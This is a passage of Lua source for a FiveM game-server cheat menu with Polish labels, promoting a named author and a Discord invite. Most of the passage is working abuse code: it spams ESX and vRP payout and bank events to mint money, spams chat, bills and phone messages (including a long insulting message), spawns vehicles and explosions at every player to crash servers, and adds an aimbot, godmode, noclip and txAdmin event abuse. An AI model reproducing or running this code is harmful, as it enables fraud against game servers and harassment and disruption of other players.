                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                  end
                else
                  if IsControlJustReleased(1, 142) and oneshotcar then
                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                  end
                end
              end
            end
          else
            SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
          end

          if crosshair then
            ShowHudComponentThisFrame(14)
          end

          if crosshairc then
            DrawTxt("~r~+", 0.495, 0.484)
          end

          if crosshairc2 then
            DrawTxt("~r~.", 0.4968, 0.478)
          end

          if dio then
            DoJesusTick(JesusRadius)
          end


          if showCoords then
            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
            roundx = tonumber(string.format("%.2f", x))
            roundy = tonumber(string.format("%.2f", y))
            roundz = tonumber(string.format("%.2f", z))

            DrawTxt("~r~X:~s~ "..roundx, 0.05, 0.00)
            DrawTxt("~r~Y:~s~ "..roundy, 0.13, 0.00)
            DrawTxt("~r~Z:~s~ "..roundz, 0.20, 0.00)
          end



         function automaticmoneyesx()
            local result = KeyboardInput("Ostrzeżenie, ta wartość nie może być pomnożona!!!", "", 100)
              if result ~= "" then
                local confirm = KeyboardInput("Jestes pewny? y - Tak, n - Nie. Wpisz y lub n", "", 0)
                if confirm == "y" then
                notify("~g~Testowanie wszystkich ~g~skryptów~s~ ~y~ESX.", true)
                TSE("esx_carthief:pay", result)
                TSE("esx_jobs:caution", "give_back", result)
                TSE("esx_fueldelivery:pay", result)
                TSE("esx_carthief:pay", result)
                TSE("esx_godirtyjob:pay", result)
                TSE("esx_pizza:pay", result)
                TSE("esx_ranger:pay", result)
                TSE("esx_garbagejob:pay", result)
                TSE("esx_truckerjob:pay", result)
                TSE("AdminMenu:giveBank", result)
                TSE("AdminMenu:giveCash", result)
                TSE("esx_gopostaljob:pay", result)
                TSE("esx_banksecurity:pay", result)
                TSE("esx_slotmachine:sv:2", result)
              elseif confirm == "n" then
                notify("~o~Operacja anulowana~s~.", false)
              else
                notify("~o~Nieprawidłowe potwierdzenie~s~.", true)
                notify("~o~Operacja anulowana~s~.", false)
              end
            end
          end

        function vrpdestroy()
            for c = 0, 9 do
				TSE("_chat:messageEntered", "^7Patr^1yksu", { 141, 211, 255 }, "^"..c.." Patryksu - discord.gg/5GMHtjKZ7F")
        wait(100)
            end
            wait(100)
            TSE("lscustoms:payGarage", {costs = -99999999})
            wait(100)
            TSE("vrp_slotmachine:server:2",999999999)
			wait(100)
            TSE("bank:deposit", 999999999)
			wait(100)
            for i=0,1000 do
			wait(100)
              TSE('paycheck:bonus')
			wait(100)
              TSE('paycheck:salary')
			      end
			local q = 99999
			for k= 1,3000 do
			wait(100)
        TSE("bank:transfer", k, q)
            end
          end

		  if vrpdbc then
			for i=0,10 do
				for veh in EnumerateVehicles() do
					Citizen.InvokeNative(0xAD738C3085FE7E11, veh, true, true)
					 
					if DoesEntityExist(veh) then
					local colors = "asdrubale"
					local extra_colors = "asdrubale"
					local neoncolor = "asdrubale"
					local mods = "asdrubale"
					local smokecolor = "asdrubale"
					local plate = math.random(1,999999)
					local plateindex = "asdrubale"
					local primarycolor = "asdrubale"
					local secondarycolor = "asdrubale"
					local pearlescentcolor = "asdrubale"
					local wheelcolor = "asdrubale"
					local neoncolor1 = "asdrubale"
					local neoncolor2 = "asdrubale"
					local neoncolor3 = "asdrubale"
					local windowtint = "asdrubale"
					local wheeltype = "asdrubale"
					local smokecolor1 = "asdrubale"
					local smokecolor2 = "asdrubale"
					local smokecolor3 = "asdrubale"
					local mods0 = "asdrubale"
					local mods1 = "asdrubale"
					local mods2 = "asdrubale"
					local mods3 = "asdrubale"
					local mods4 = "asdrubale"
					local mods5 = "asdrubale"
					local mods6 = "asdrubale"
					local mods7 = "asdrubale"
					local mods8 = "asdrubale"
					local mods9 = "asdrubale"
					local mods10 ="asdrubale"
					local mods11 = "asdrubale"
					local mods12 = "asdrubale"
					local mods13 = "asdrubale"
					local mods14 = "asdrubale"
					local mods15 = "asdrubale"
					local mods16 = "asdrubale"
					local mods23 = "asdrubale"
					local mods24 = "asdrubale"
					local turbo = "asdrubale"
					local tiresmoke = "asdrubale"
					local xenon = "asdrubale"
					local neon1 = "asdrubale"
					local neon2 = "asdrubale"
					local neon3 = "asdrubale"
					local bulletproof = "asdrubale"
					local variation = "asdrubale"
					TriggerServerEvent('lscustoms:UpdateVeh', vehicle, plate, plateindex,primarycolor,secondarycolor,pearlescentcolor,wheelcolor,neoncolor1,neoncolor2,neoncolor3,windowtint,wheeltype,mods0,mods1,mods2,mods3,mods4,mods5,mods6,mods7,mods8,mods9,mods10,mods11,mods12,mods13,mods14,mods15,mods16,turbo,tiresmoke,xenon,mods23,mods24,neon0,neon1,neon2,neon3,bulletproof,smokecolor1,smokecolor2,smokecolor3,variation)
					end
				end
			end
		  end

if gcphonedestroy then
	local numBase0 = math.random(100,999)
	local numBase1 = math.random(0,9999)
	local num = string.format("%03d-%04d", numBase0, numBase1 )
	local num2 = string.format("%03d-%04d", numBase0, numBase1 )
	local transmitter = num
	local receiver = num2
	local message = "我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地"
	local owner = math.random(0,1)
	local sourcePlayer = math.random(0,87)
	local channel = num
	local messages = message..message..message..message..message..message..message..message
	local phone_number = num
	TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, messages, owner)
	TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
end

          if haharip then
            esxdestroyv3()
			nukeserver()
			vrpdestroy()
          end

          function esxdestroyv3()
            TSE("esx_jobs:caution", "give_back", 9999999999)
            TSE("esx_fueldelivery:pay", 9999999999)
            TSE("esx_carthief:pay", 9999999999)
            TSE("esx_godirtyjob:pay", 9999999999)
            TSE("esx_pizza:pay", 9999999999)
            TSE("esx_ranger:pay", 9999999999)
            TSE("esx_garbagejob:pay", 9999999999)
            TSE("esx_truckerjob:pay", 9999999999)
            TSE("AdminMenu:giveBank", 9999999999)
            TSE("AdminMenu:giveCash", 9999999999)
            TSE("esx_gopostaljob:pay", 9999999999)
            TSE("esx_banksecurity:pay", 9999999999)
            TSE("esx_slotmachine:sv:2", 9999999999)
            for c = 0, 9 do

              TSE("_chat:messageEntered", "^7Patr^1yksu^7", { 141, 211, 255 }, "^"..c.."Patryksu - discord.gg/5GMHtjKZ7F")
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do
              TSE("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 101337)
              TSE("esx_billing:sendBill", GetPlayerServerId(i), "society_police", "Patryksu - najlepsze menu do fivema discord.gg/5GMHtjKZ7F", 13374316)
            end
          end



          function nukeserver()
            local camion = "Avenger"
            local avion = "CARGOPLANE"
            local avion2 = "luxor"
            local heli = "maverick"
            local random = "blimp2"
            while not HasModelLoaded(GetHashKey(avion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion))
            end
            while not HasModelLoaded(GetHashKey(avion2)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion2))
            end
            while not HasModelLoaded(GetHashKey(camion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(camion))
            end
            while not HasModelLoaded(GetHashKey(heli)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(heli))
            end
            while not HasModelLoaded(GetHashKey(random)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(random))
            end
            for i=0,128 do
              CreateVehicle(GetHashKey(camion),GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) 
              CreateVehicle(GetHashKey(avion),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
              CreateVehicle(GetHashKey(avion2),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
              CreateVehicle(GetHashKey(heli),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
			        CreateVehicle(GetHashKey(random),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
              AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
			      end
          end

          if rainbowh then
            for i = -1, 12 do
              Citizen.Wait(0)
              local ra = RGB(1.0)
              SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
              SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
              if i == 12 then
                i = -1
              end
            end
          end

          if t2x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
          end

          if t4x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
          end

          if t10x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
          end

          if t16x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
          end

          if tdx then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
          end

          if tbxd then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
          end


          if sianko then
            TriggerServerEvent('tost:zgarnijsiano')
          end

          if Noclip then
            local currentSpeed = 2
            local noclipEntity =
            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
            FreezeEntityPosition(PlayerPedId(-1), true)
            SetEntityInvincible(PlayerPedId(-1), true)

            local newPos = GetEntityCoords(entity)

            DisableControlAction(0, 32, true)
            DisableControlAction(0, 268, true)

            DisableControlAction(0, 31, true)

            DisableControlAction(0, 269, true)
            DisableControlAction(0, 33, true)

            DisableControlAction(0, 266, true)
            DisableControlAction(0, 34, true)

            DisableControlAction(0, 30, true)

            DisableControlAction(0, 267, true)
            DisableControlAction(0, 35, true)

            DisableControlAction(0, 44, true)
            DisableControlAction(0, 20, true)

            local yoff = 0.0
            local zoff = 0.0

            if GetInputMode() == "MouseAndKeyboard" then
              if IsDisabledControlPressed(0, 32) then
                yoff = 0.5
              end
              if IsDisabledControlPressed(0, 33) then
                yoff = -0.5
              end
              if IsDisabledControlPressed(0, 34) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
              end
              if IsDisabledControlPressed(0, 35) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
              end
              if IsDisabledControlPressed(0, 44) then
                zoff = 0.21
              end
              if IsDisabledControlPressed(0, 20) then
                zoff = -0.21
              end
            end

            newPos =
            GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

            local heading = GetEntityHeading(noclipEntity)
            SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
            SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
            SetEntityHeading(noclipEntity, heading)

            SetEntityCollision(noclipEntity, false, false)
            SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

            FreezeEntityPosition(noclipEntity, false)
            SetEntityInvincible(noclipEntity, false)
            SetEntityCollision(noclipEntity, true, true)
          end
        end
        end)

        Citizen.CreateThread(function()
          FreezeEntityPosition(entity, false)
          local playerIdxWeapon = 1;
          local WeaponTypeSelect = nil
          local WeaponSelected = nil
          local ModSelected = nil
          local currentItemIndex = 1
          local selectedItemIndex = 1
          local noclip1 = 1000
          local noclip2 = 1000
          local heal1 = 200
          local heal2 = 200
          local powerboost = { 1.0, 2.0, 4.0, 10.0, 512.0, 9999.0 }
          local attach = { pounder }
          local noclip = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100 }
          local heal = { 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144,
		  146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200 }
          local spawninside = false
          JesusRadius = 5.0
          JesusRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
          local currJesusRadiusIndex = 1
          local selJesusRadiusIndex = 1
          LR.CreateMenu(LynxIcS, LynxIcZ)
          LR.CreateSubMenu(sMX, LynxIcS, bytexd)
          LR.CreateSubMenu(TRPM, LynxIcS, bytexd)
          LR.CreateSubMenu(Ped, LynxIcS, bytexd)
          LR.CreateSubMenu(WMPS, LynxIcS, bytexd)
          LR.CreateSubMenu(advm, LynxIcS, bytexd)
          LR.CreateSubMenu(VMS, LynxIcS, bytexd)
          LR.CreateSubMenu(OPMS, LynxIcS, bytexd)
          LR.CreateSubMenu(espaa, LynxIcS, bytexd)
          LR.CreateSubMenu(info, LynxIcS, bytexd)
          LR.CreateSubMenu(info, RESO, bytexd)
          LR.CreateSubMenu(RESO, info, bytexd)
          LR.CreateSubMenu(Allserwers, LynxIcS, bytexd)
          LR.CreateSubMenu(poms, OPMS, bytexd)
          LR.CreateSubMenu(dddd, advm, bytexd)
          LR.CreateSubMenu(fivez, advm, bytexd)
          LR.CreateSubMenu(LMX, bytexd)
          LR.CreateSubMenu(esms, LMX, bytexd)
          LR.CreateSubMenu(ESXD, LMX, bytexd)
          LR.CreateSubMenu(ESXC, LMX, bytexd)
          LR.CreateSubMenu(VRPT, LMX, bytexd)
          LR.CreateSubMenu(MSTC, LMX, bytexd)
          LR.CreateSubMenu(Tmas, poms, bytexd)
          LR.CreateSubMenu(WTNe, WMPS, bytexd)
          LR.CreateSubMenu(WTSbull, WTNe, bytexd)
          LR.CreateSubMenu(WOP, WTSbull, bytexd)
          LR.CreateSubMenu(MSMSA, WOP, bytexd)
          LR.CreateSubMenu(CTSa, VMS, bytexd)
          LR.CreateSubMenu(CTS, CTSa, bytexd)
          LR.CreateSubMenu(cAoP, CTS, bytexd)
          LR.CreateSubMenu(MTS, VMS, bytexd)
          LR.CreateSubMenu(mtsl, MTS, bytexd)
          LR.CreateSubMenu(CTSmtsps, mtsl, bytexd)
          LR.CreateSubMenu(GSWP, OPMS, bytexd)
          LR.CreateSubMenu(espa, LynxIcS, bytexd)
          LR.CreateSubMenu(bmm, VMS, bytexd)
          LR.CreateSubMenu(SPD, Tmas, bytexd)
          LR.CreateSubMenu(RAPE, Tmas, bytexd)
          LR.CreateSubMenu(gccccc, VMS, bytexd)
          LR.CreateSubMenu(CMSMS, WMPS, bytexd)
          LR.CreateSubMenu(GAPA,OPMS,bytexd)
                  function tip(text)
      SetNotificationTextEntry("STRING")
      AddTextComponentString(text)
      DrawNotification(true, false)
    end
                local noname = math.random(1, 3)
              if noname == 1 then
                tip("Ciekawostka: Podczas naprawienia tego menu mam ochotę się zajebać średnio 20 razy na sekundę")
              elseif noname == 2 then
                tip("Tip: Sprawdź triggery")
              elseif noname == 3 then
                tip("Ciekawostka: Kod tego menu ma takie chujowe wcięcia że nie rozczytasz się bo ci oczy zwiędną")
              end


          local SelectedPlayer

          while Enabled do

            if LR.IsMenuOpened(LynxIcS) then
              if LR.MenuButton("~w~Gracz", sMX) then
              elseif LR.MenuButton("~w~Gracze online", OPMS) then
              elseif LR.MenuButton("~w~Teleport", TRPM) then
              elseif LR.MenuButton("~w~Pojazd", VMS) then
              elseif LR.MenuButton("~w~Broń", WMPS) then
              elseif LR.MenuButton("~w~Świat", advm) then
              elseif LR.MenuButton("~w~ESP", espa) then
              elseif LR.MenuButton("~w~NPC-ty ~r~RYZYKO", Ped) then
              elseif LR.MenuButton("~w~Triggery", espaa) then
              elseif LR.MenuButton("~w~Informacje", info) then
                notify("~r~Patryksu - discord.gg/5GMHtjKZ7F")
              elseif LR.MenuButton("~w~Triggery LMX", LMX) then
			  elseif LR.Button("~r~                                Wyłącz menu") then
			  Enabled = false
              end


              LR.Display()
			elseif LR.IsMenuOpened(sMX) then
			if LR.CheckBox("~W~Nieśmiertelność", Godmode, function(enabled) Godmode = enabled end) then
              elseif LR.CheckBox("~w~Widzialność", invisible, function(enabled) invisible = enabled end) then
              elseif LR.Button("~m~[NATIVE] ~w~Rev") then
                NetworkResurrectLocalPlayer(GetEntityCoords(PlayerPedId()), 1.0, true, false)
                TriggerEvent("playerSpawned", GetEntityCoords(PlayerPedId()))
                StopScreenEffect('DeathFailOut')
                DoScreenFadeIn(800)
              elseif LR.Button("~m~[ESX]~w~ Rev") then
                TriggerEvent('esx_ambulancejob:revive')
              elseif LR.ComboBox("~w~Ulecz ~m~[nie polecam nic zmieniać, zbugowane]", heal, heal1, heal2, function(heal3, heal4)
                heal1 = heal3
                heal2 = heal4
                SetEntityHealth(GetPlayerPed(-1), heal3)
                end) then
              elseif LR.ComboBox("~w~Daj kamizelkę kuloodporną", noclip, noclip1, noclip2, function(noclip3, noclip4)
                noclip1 = noclip3
                noclip2 = noclip4
                SetPedArmour(PlayerPedId(-1), noclip3)
                end) then
              elseif LR.CheckBox("~w~Szybkie bieganie",fastrun,function(enabled)fastrun = enabled end) then
              elseif LR.CheckBox("~w~Mega szybkie bieganie",fastrun2,function(enabled)fastrun2 = enabled end) then
              elseif LR.CheckBox("~w~W chuj szybkie bieganie", fastrun3,function(enabled)fastrun3 = enabled end) then
              elseif LR.CheckBox("~w~Super skok", SuperJump, function(enabled) SuperJump = enabled end) then
              elseif LR.CheckBox("~w~NoRagdoll", noragdoll,function(enabled)noragdoll = enabled end) then
              elseif LR.CheckBox("~w~Noclip",Noclip,function(enabled)Noclip = enabled end) then
              elseif LR.Button("~g~txAdmin ~w~noclip") then
                if txNoclip == false then
                  SetEntityVisible(GetPlayerPed(-1), false, 0)
                TriggerEvent('txcl:setPlayerMode', 'noclip', true)
                txNoclip = true
                txGodMode = false
                txSuperJump = false
                else
                  TriggerEvent('txcl:setPlayerMode', 'none', true)
                  SetEntityVisible(GetPlayerPed(-1), true, 0)
                txNoclip = false
                txGodMode = false
                txSuperJump = false
                end
              elseif LR.Button("~g~txAdmin ~w~super skok") then
                if txSuperJump == false then
                TriggerEvent('txcl:setPlayerMode', 'superjump', true)
                txSuperJump = true
                txNoclip = false
                txGodMode = false
                else
                  TriggerEvent('txcl:setPlayerMode', 'none', true)
              
                txNoclip = false
                txGodMode = false
                txSuperJump = false
                end
              elseif LR.Button("~g~txAdmin ~w~godmode") then
                if txGodMode == false then
                TriggerEvent('txcl:setPlayerMode', 'godmode', true)
                txGodMode = true
                txNoclip = false
                txSuperJump = false
                else
                  TriggerEvent('txcl:setPlayerMode', 'none', true)
                txNoclip = false
                txGodMode = false
                txSuperJump = false
                end
              elseif LR.Button("~w~Zresetuj opcje ~g~txAdmin") then
                TriggerEvent('txcl:setPlayerMode', 'none', true)
                txNoclip = false
                txGodMode = false
                txSuperJump = false
              elseif LR.Button("~w~Skin ~p~GalaxyRDM") then
                Citizen.CreateThread(function()
                local ped = PlayerPedId()
                for i = 0, 7 do
                  ClearPedProp(ped, i)
                end
                for i = 0, 11 do
                  SetPedComponentVariation(ped, i, 0, 0, 0) 
                end 
                SetPedComponentVariation(ped, 1, 134, 13, 0) 
                SetPedComponentVariation(ped, 3, 9, 0, 0) 
                SetPedComponentVariation(ped, 4, 106, 13, 0) 
                SetPedComponentVariation(ped, 6, 83, 13, 0) 
                SetPedComponentVariation(ped, 8, 15, 0, 0) 
                SetPedComponentVariation(ped, 11, 274, 13, 0) 
              end)
	          elseif LR.CheckBox("AimBot",AimBot,function(enabled)AimBot = enabled end) then
			  elseif LR.CheckBox("Nieskonczona wytrzymałość",InfStamina,function(enabled)InfStamina = enabled end) then
              elseif LR.CheckBox("Shiftboost ~g~SHIFT ~r~CTRL",VehSpeed,function(enabled)VehSpeed = enabled end) then
              end
			  
			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 209) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 210) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end
			
						if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end
			
			if AimBot then
				for i = 0, 64 do
					if i ~= PlayerId() then
						if IsPlayerFreeAiming(PlayerId()) then
							local TargetPed = GetPlayerPed(i)
							local TargetPos = GetEntityCoords(TargetPed)
							local Exist = DoesEntityExist(TargetPed)
							local Dead = IsPlayerDead(TargetPed)

							if Exist and not Dead then
								local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
								if IsEntityVisible(TargetPed) and OnScreen then
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
										local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
										SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
									end
								end
							end
						end
					end
				end
			end

        LR.Display()
      elseif LR.IsMenuOpened(LMX) then
        drawDescription("Triggery", 0.46, 0.46)
        if LR.MenuButton("~y~»  ~s~ ~w~ESX ~r~Kasa", esms) then
          print("dupa")
        elseif LR.MenuButton("~y~»  ~s~ ~w~Typowe ~r~triggery", MSTC) then
          print("dupa")
        end

        LR.Display()
      elseif LR.IsMenuOpened(esms) then
        drawDescription("Respawn Money", 0.42, 0.42)
        if LR.MenuButton("~y~»  ~s~ ~w~OnlyRP ~r~Kasa [~r~Ryzykowne]") then
        end
        if LR.MenuButton("~y~»  ~s~ ~w~ExileRP ~r~Money [~r~Ryzykowne]") then
        end
        if LR.MenuButton("~y~»  ~s~ ~w~RichRP ~r~Money [~r~Ryzykowne]") then
        end
        if LR.MenuButton("~y~»  ~s~ ~w~XenonRP ~r~Money [~r~Ryzykowne]") then
        end
        if LR.MenuButton("~y~»  ~s~ ~w~BambikiRP ~r~Money [~r~Ryzykowne]") then
        end
      elseif LR.IsMenuOpened(MSTC) then
        drawDescription("Typowe triggery", 0.46, 0.46)
            
        if LR.Button("Trigger 1") then
          print("trigger 1")
        elseif LR.Button("Trigger 2") then
          print("trigger 2")
        end
    
      LR.Display()
    

              LR.Display()
            elseif LR.IsMenuOpened(OPMS) then
              if LR.MenuButton("~r~Wszyscy Gracze", GAPA) then
              else
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                  local currPlayer = playerlist[i]
                  if LR.MenuButton("~s~["..GetPlayerServerId(currPlayer).."] ~w~"..GetPlayerName(currPlayer).." "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~r~Martwy" or "~g~Żywy"), 'PlayerOptionsMenu') then
                    SelectedPlayer = currPlayer
                  end
                end
              end

              LR.Display()
            elseif LR.IsMenuOpened(poms) then
			  if LR.MenuButton("~w~Troll ~s~[" .. GetPlayerName(SelectedPlayer) .. "]", Tmas) then
elseif LR.CheckBox("~w~Obserwuj ~m~[nie działa, od razu się wyłącza]", spetejting, function(enabled)
    spetejting = enabled

    if spetejting then
        if SelectedPlayer ~= nil and SelectedPlayer ~= PlayerId() then
            -- włącz spectate dla wybranego gracza
            SpectatePlayer(SelectedPlayer)
        else
            notify("Nie można obserwować siebie ani nie wybrano gracza!", true)
            spetejting = false
        end
    else
        -- wyłącz spectate
        if Spectating and SpectateTarget then
            SpectatePlayer(SpectateTarget)
        end
    end
end) then

            elseif LR.CheckBox("~w~One shot ~m~[Ryzykowne]", oneshot, function(enabled) oneshot = enabled end) then 
        elseif LR.Button("~w~Teleportuj się do gracza") then
            local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
            SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)

			  elseif LR.Button("~w~Zabierz skina") then
			  ClonePedlol(SelectedPlayer)	
      
              elseif LR.MenuButton("~w~Daj broń ~m~[GIGANTYCZNE RYZYKO]", GSWP) then            

              elseif LR.Button("~w~Daj wszystkie bronie ~m~[NAJWIĘKSZE RYZYKO]") then
                for i = 1, #allWeapons do
                  GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                end

              elseif LR.Button("~w~Zresp pojazd ~m~[Ryzykowne]") then
                local ped = GetPlayerPed(SelectedPlayer)
                local ModelName = KeyboardInput("Wpisz nazwę pojazdu", "model", 100)
                if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                  RequestModel(ModelName)
                  while not HasModelLoaded(ModelName) do
                    Citizen.Wait(0)
                  end
